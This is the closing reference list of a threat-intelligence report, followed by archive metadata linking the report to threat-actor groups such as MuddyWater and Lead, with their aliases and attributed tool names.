[https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/microsoft-](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/microsoft-exchange-server-protection)\n\n[exchange-server-protection](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/microsoft-exchange-server-protection)\n\n  - [https://awakesecurity.com/blog/catching-the-white-stork-in-flight/](https://awakesecurity.com/blog/catching-the-white-stork-in-flight/)\n\n  - [https://thedfirreport.com/2021/06/20/from-word-to-lateral-movement-in-1-hour/](https://thedfirreport.com/2021/06/20/from-word-to-lateral-movement-in-1-hour/)\n\n  - [https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/)\n\n[sample%E2%80%AFtargets-webservers/](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/)\n\n  - [https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-](https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/)\n\nand-cobalt-strike/\n\nThreat Intelligence & Incident Response Team\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://secjoes-reports.s3.eu-central-1.amazonaws.com/Sockbot%2Bin%2BGoLand.pdf"
    ],
    "report_names": [
        "Sockbot%2Bin%2BGoLand.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d1f8bd4e-bcd4-4101-9158-6158f1806b38",
            "created_at": "2023-01-06T13:46:39.487358Z",
            "updated_at": "2025-03-27T02:00:03.107568Z",
            "deleted_at": null,
            "main_name": "BazarCall",
            "aliases": [
                "BazaCall",
                "BazzarCall"
            ],
            "source_name": "MISPGALAXY:BazarCall",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1646341358,
    "ts_modification_date": 1646341358,
    "files": {
        "pdf": "https://archive.orkl.eu/f4698039b0d5cbee7cf460e831199a24ec7ebd8e.pdf",
        "text": "https://archive.orkl.eu/f4698039b0d5cbee7cf460e831199a24ec7ebd8e.txt",
        "img": "https://archive.orkl.eu/f4698039b0d5cbee7cf460e831199a24ec7ebd8e.jpg"
    }
}